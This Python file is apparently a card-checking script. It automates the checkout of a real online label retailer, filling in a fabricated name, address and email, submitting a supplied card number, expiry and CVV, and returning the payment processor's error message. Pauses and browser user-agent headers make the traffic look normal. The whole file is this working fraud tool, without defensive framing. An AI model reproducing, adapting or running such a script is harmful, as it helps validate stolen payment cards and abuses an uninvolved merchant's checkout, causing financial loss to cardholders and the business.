from all.configs._def_main_ import *

async def auth(cc, mes, ano, cvv) -> str:
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        params = {'pui': '33', 'options': '', 'colorOptions': '', 'blackOpticalMark': 'false', 'matrixIntact': 'false', 'CAUI': '', 'qty': '1'}
        head1 = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)', 'pragma': 'no-cache', 'accept': '*/*'}

        async with session.get('https://laserinkjetlabels.com/AJAX/custom/add-to-cart/', params=params, headers=head1) as response:
            req = await response.text()

            caui = parseX(req, 'CAUI>', '<')
            caui2 = parseX(req, 'CAUI>', '=<')

            head2 = {'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'}

            async with session.get(f'https://laserinkjetlabels.com/cart/?CAUI={caui}', headers=head2) as response:
                req2 = await response.text()
                event = parseX(req2, 'id="__EVENTVALIDATION" value="', '="')
                eve = parseX(req2, 'name="ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnCIUI" id="ctl00_Page_Content_Cart_Summary_rptCartItems_ctl01_hdnCIUI" value="', '"')

                data = {'__EVENTTARGET': '', '__EVENTARGUMENT': '', '__VIEWSTATE': '', '__EVENTVALIDATION': f'{event}', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnCIUI': f'{eve}', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$txtQty': '1', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnQty': '', 'ctl00$Page_Content$txtEmail$Cart_Email': '',
                        'ctl00$Page_Content$txtPassword$Cart_Password': '', 'ctl00$Page_Content$btnCheckout$Checkout': 'Proceed to Checkout', 'ctl00$Page_Content$txtPromoCode': '', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl01$JSTA': '1', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl01$PUI': '575', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl01$Quantity': '1',  'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl02$JSTA': '1', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl02$PUI': '153', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl02$Quantity': '1', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl03$JSTA': '0', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl03$PUI': '12855', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl03$Quantity': '1', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl04$JSTA': '0',  'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl04$PUI': '12908', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl04$Quantity': '1', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl05$JSTA': '0', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl05$PUI': '12909', 'ctl00$Page_Content$recommendedproducts$rptProductsPage$ctl05$Quantity': '1', }

                head3 = {'sec-fetch-user': '?1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'}
                
                await asyncio.sleep(5)

                async with session.post(f'https://laserinkjetlabels.com/cart/?CAUI={caui}', headers=head3, data=data) as response:
                    req3 = await response.text()
                    event2 = parseX(req3, 'id="__EVENTVALIDATION" value="', '=="')
                    eve2 = parseX(req3, 'name="ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnCIUI" id="ctl00_Page_Content_Cart_Summary_rptCartItems_ctl01_hdnCIUI" value="', '"')

                    data2 = {'__EVENTTARGET': '', '__EVENTARGUMENT': '', '__VIEWSTATE': '', '__EVENTVALIDATION': '/wEdAKkBr1Vw9aGBC3r3jK9LxwpmDw/zofkSDM5xttYbwheoxACaJ1Vp3NCcjGwFtK5OzDfqXbPxGerzRPhs6lwjAyZBZAKa3xQmqUJiVeOa3/5dP1CZHwU++46hXbqoTu757d2DRBpVL8yrAiHhtZihpDIJi3VCuM6xOv+hjuOKuXlRWYnvv30rY2/f4XUfVJNPojO6y5mNpInvLxrG8CErVUiKGJjBpjPefG3v6HAhJWIOuoGgzEe88EjNCzDM/UQgjg1a+SHIrtrU+0GWfXlPxw11ekY+JovvEjcbUP+i3+Vvd2OTcCsFboTjQk6mAlFrUlq0p1yKEdIycSXxOyYGqLDwT7aYma+EvLW/OUH46DVtswpphDiYEkfjiTxt1Y+Qa2LSPP/Eif2MKIWz+a142+TpwIGXjpttdEXLrdqISrzIhNZT0i1CxXs8KI1SQYhsXlKN6PqR0OgqG+IGDYcduZi5FyIbGh+4+OO5uyu+KGRdJJiXzA6Ti6/fmGEaW7Ystgnj4qKYFgIa1/2ntIJyx0zFvj1bllggEue+nXnSTcST6L17tgV41d77FwYuDo0dL2kJtuvtAfExRIeY9Sz0j/t//pYHFYZaGW5n1CHv3FL3EsXzFH225KGj91gDyMg3MzhjdIp28syx70UGQzk/F4HnJevoROGaayni1SSzSFL4W3zgBiMTiQZEl+6e8vdH51/jJtVhu65OxkIxd/debfWLkVNoGWLMNBwoBYsiXXw1At8W5G3E6yG0IGtxBHABBfE1pWwOM9PRTlAVTRL8sbQaxmi4p4Zb5g2/AUj64rXfZIXU+sHRn1ywOUeCasdULa1hK+9FeCT+KgQ0vUCL9L23EGzbbK02k9dSKCynYok/SyBQDr129d/tGZAcGpcG3/20bE2aNZd18XL/rpbqwAahjq7F6NeFhzmg8Oo2qDPFJ0LLpwao8St/vtK4w0ICESHWh6R27zcx39NWnF11qQPpaTKPJyZEk9iiGwAHnFu7NrLWsfwgznbKazTylNh/KbB+Onbv+ryOOEZjw8ppWYnB9qC+abcTnAB7uFFbY69vZsL68UR9OD4xHGq0l4hEIwVfTvRSUdJ9NFsCydy0Y07DILmNXlXg0AhtHPJMoeJvsQSQIdA+jijFKlgowX11HYAv7OuV4L5zhV1ZolbfZpu1E5XZdwV7R0OTjeIoZAIljY6PpQPuzYzOvWqlP7fpj0qOW1k5TpDm+ja0CGP0Lp6qG5bt2dPXalLERkRPYK8APtiNMPd8NNsoDEGqBGlA6OdTzBNv7+l9IAZbet88OlTt+0Uv1I0mXWTvVZ2aJ/PKxgCEX4qZsIMFW+c8kBRft0XfKEsgAFkzr9SCE84qM10/dAtXXWSKDx6qseyyxFhksa2QUNamrorcEeSFnIn1LKyBt5WQa/J4L/FeieEG0WZ0IFC2Q7J+uDlYNUKxL8ABPbUSiszl6Dq6SJDcmIaO2oRTdeoH+3EGT8HrgkkiPBJhowz27mU0xXBRMvtkMleILWPHnfmtL97zPMPZ26mAHSeJuKhnusP+Gv85xeEjGTGGxX0nbB6OMTDbaUaRLg4vW5W11/jHM0d/VBimPelFSjX55pqDEw32mahyLAOTYQIvp+fd0ElxGw+QOEGoTPMUqPnb7sSK+Wi0p0MO6nkigAnsdvPyhLs9L0mrFgvjXzdgl+Q+2U8rVSY68szog4BtuuhX8Wg8QdiNxbv94n61pQl/aDkZtZhwJnMvEeUt3kgLn07TT8qFORkjJ48Pz1+Yt1f8wnWAhQFfhhqnJkUlWmJAz4g2rumZqbwGzIc6QXtt3I/3qvqXIQTq3Iy9a9PHvgu7xuTdc3ke9mxhoxonl2ZWi67tTMiae8GQ++gI2yAWIzFp8sdyuzrqPsmcztN7nF/SU3TC65p8bxG8d07e54tSAEjd9tVEREyTZuEmf1PaCGTpO8NpaKlEghfboOrHkKr6lTZnyx7A7G0DetoX6KCP7YJVUlsenoBrleuRsjNxiCjLqvi+fBmZOVKZAjSHuYJH1cnpgVrZ6kGr5smCWs1KRixH0aGYYb5xMFRvgvQn4xURYB7HozdTd4Y8tyCBV/Xk5dMHadYN2PD7yNDN/KCzl28KDI+KjThwFHbz+xXiKmkIhNdZGb24ej6Oj0/Qq6wXkzbWCdwlGq3R6io2Pd+0HkpPWzhFRQ2g47+PETSuWRurFPMz/L2IU07bS0+5V5eaSnMYxEBV8HahcgBizchHCXGUpkcDR96IvA02j6+OJA5gdC/tmrTswur3cLzlz7PRrK/axnWon8U/M8qXkSbFOg3D4ydt6KPIEgRW0HaxcZpuWo34MhcBo6pI93gy2nL++nuBghs8Y5jFsctLTiox317uptwU4K6xWeDu2N3ZOHNJ/vyKiHteqsjrTFvunhrFzacTj7bsgeX8aCWdSuQa2XBq8Rm4vip59R9emJ/JXuBs+OKSI8sGchDxxe8D14n67pQSxFHflnZ84Og9LZS2zSllFDEZtxFENCifehs3LHfLk2sr4ZNzGDFp+h3tas+vv2WsJcvjYbJCce6Yi3KMnoOwpNo8gFjs0NzHbcxP9PMd4b9Yj8EO1dUiMehZaDIsA+uG4nz0s0OvZR9wtMZMR3UROyp2vO4EcS3G53IsniK7/weUStYkKbxxddEDEg2iNBi3R/pJvZRvk+VMkzrT9dIu8v/ikGa7DAtGe8FcieH2vGkOY+hvcbPZBipAMOqPlgsJgEAoe6aeE1tZkjcnHnvdYHXmGXzFnEKTaNiKCHSjxM8Zg2Kd6axVeN7WG7WGW0uP0PpwCNATz/Qx7Dj36mHYLBFkYhN/ke9mmdLj0a3NaIT58v+VvkquNmI+KhpVVSKPF0NARYrrjhfpsEXWbnPtxI6jKeoZ4N2PmNL1Eu4iQfQACenDzF2VWMemtrLwmTYrHXqI84dDvhXJjS5cEz8OFKt9mmIhl7XW4lI1aHDSzu7t+sb94Qn62v04A3tbZOj/A23f+89qSzkbDINnMElvixHi3gSpMO35uR5ofc+gLkulqpyDIrxGeSaZucnM/xllRQY/3cTXY8R2pPbx5s99o2+5+JtIVOoZTsMbuIg9ELTSvhPfsdcrdLWq6z4vDticP2zb33uVITRrhD85bgrtNswRtn0VvTm7zes5WkubRpyiIBtJxgSGcelyCMIqkkkaCm5H/2xEuFg3Ibmerg3PlLJxFlUn1I/mOxWipITv0jSO4yZL6IWhVr4icRbHmGPM3Xri5L9ubbgSgMH5ESmfT/u/J4HTrYXyBwheqp7xahi+vxmHLAfEbizTeZbqPowgLdaZZlFrIGc3sozwGb4gQIF2GggZVhr5XZLMNg5lC6Qhio4Ji4T3H0f1la2L2eUZx5BA0f37ULRHXPJcMGahksJRbzr3y4TWr+bAqQWuh2R1/tl5vKdWosj7xxHXvMN6h4m+Psl1zXKpd2yTB12kweh2ZYz58ruxHie/OfPhXg+iZPJ8AmsGu1TBY6inu7JHawI4cdWILm9X/AGoeIyBjmwrgSzgHmrf/b9ArvztyiDlnAsuJCKT4cgJdxI0eAvjAzXTRFMb55T++2U5f76vLecmne2cq/HNTkIx1E4ZAZQLKixL0NrvdaYdH8vvNYtUkjB69qlQevk/JimT', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnCIUI': f'{eve2}', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnQty': '', 'ctl00$Page_Content$chkSameShip': 'on', 'ctl00$Page_Content$billFirstName$billFirstName': 'jorge', 'ctl00$Page_Content$billLastName$billLastName': 'garcia', 'ctl00$Page_Content$billCompany$billCompanyName': '', 'ctl00$Page_Content$billAddress1$billAddress1': 'street 32 allen', 'ctl00$Page_Content$billAddress2$billAddress2': '',  'ctl00$Page_Content$billCity$billCity': 'new york', 'ctl00$Page_Content$billCountry$billCountry': 'United States', 'ctl00$Page_Content$billState$billStateProvince': 'NY', 'ctl00$Page_Content$ctrlGeorgiaExemption$txtExemptionNumber$ExemptionNumber': '',  'ctl00$Page_Content$ctrlGeorgiaExemption$txtOtherExemptionReason$OtherExemptionReason': '', 'ctl00$Page_Content$billPostalZip$billPostalZip': '10026',
                             'ctl00$Page_Content$billTelephone$billTelephone': '2516273822', 'ctl00$Page_Content$billEmail$billEmail': 'jorgeantonio@gmail.com', 'ctl00$Page_Content$Password$txtPassword': '', 'ctl00$Page_Content$shipFirstName$shipFirstName': 'jorge', 'ctl00$Page_Content$shipLastName$shipLastName': 'garcia', 'ctl00$Page_Content$shipCompany$shipCompanyName': '', 'ctl00$Page_Content$shipAddress1$shipAddress1': 'street 32 allen', 'ctl00$Page_Content$shipAddress2$shipAddress2': '', 'ctl00$Page_Content$shipCity$shipCity': 'new york', 'ctl00$Page_Content$shipCountry$shipCountry': 'United States', 'ctl00$Page_Content$shipState$shipStateProvince': 'NY', 'ctl00$Page_Content$shipPostalZip$shipPostalZip': '10026', 'ctl00$Page_Content$shipTelephone$shipTelephone': '2516273822', 'ctl00$Page_Content$btnCheckout': 'Proceed to Payment', }

                    head4 = {'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'}

                    async with session.post(f'https://laserinkjetlabels.com/cart/checkout-billing-shipping/?isJS=1&CAUI={caui}', headers=head4, data=data2) as response:
                        req4 = await response.text()
                        event3 = parseX(req4, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')
                        eve3 = parseX(req4, 'name="ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnCIUI" id="ctl00_Page_Content_Cart_Summary_rptCartItems_ctl01_hdnCIUI" value="', '"')
                        cullo = parseX(req4, 'CUUI=', '"')
                        # print(f"{event3}\n{eve3}\n{cullo}")

                        await asyncio.sleep(5)

                        data3 = {'__EVENTTARGET': '', '__EVENTARGUMENT': '', '__VIEWSTATE': '', '__EVENTVALIDATION': f'{event3}', 'taxField': '0.00', 'discountField': '0.00', 'totalField': '15.99', 'taxOverride': '0', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnCIUI': f'{eve3}', 'ctl00$Page_Content$Cart_Summary$rptCartItems$ctl01$hdnQty': '', 'ctl00$Page_Content$hdnSubtotal': '15.99', 'ctl00$Page_Content$hdnTR': '0', 'shipMethod': '7IBEApsC4hU=', 'ctl00$Page_Content$CustomShipping$txtAccountNumber$txtAccountNumber': '352677', 'ctl00$Page_Content$CustomShipping$txtAccountShippingMethod$txtAccountShippingMethod': '', 'ctl00$Page_Content$CustomShipping$lbSignatureNeeded$lbSignatureNeeded': 'false', 'ctl00$Page_Content$CustomShipping$lbShippingAddressType$lbShippingAddressType': 'Commercial', 
                                 'ctl00$Page_Content$CustomShipping$txtPONumber$txtPONumber': '', 'ctl00$Page_Content$lbPaymentMethod$lbPaymentMethod': 'Credit Card', 
                                 'ctl00$Page_Content$txtCardNumber$txtCreditCardNumber': f'{cc}', 'ctl00$Page_Content$txtCardholderName$txtCardholderName': 'Jorge antonio', 'lbExpMonth': f'{mes}', 'lbExpYear': f'{ano}', 'CVV2': f'{cvv}', 'ctl00$Page_Content$txtShippingInstructions$txtShippingInstructions': '', 'ctl00$Page_Content$btnProcessCheckout': 'Process Payment', }

                        head5 = {'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'}

                        async with session.post(f'https://laserinkjetlabels.com/cart/checkout-payment-info/?isJS=True&CAUI={caui}&CUUI={cullo}', headers=head5, data=data3) as response:
                            req5 = await response.text()
                            resp = parseX(req5, 'div id="pErrorText" class="error" style="margin-bottom: 1em;">There appears to be an error with your transaction. The error is as follows:<br /><strong>', '</strong>. Please check any credit card information associated with your card and try again.</div><form method="post"')
                            # print(resp)
                            return resp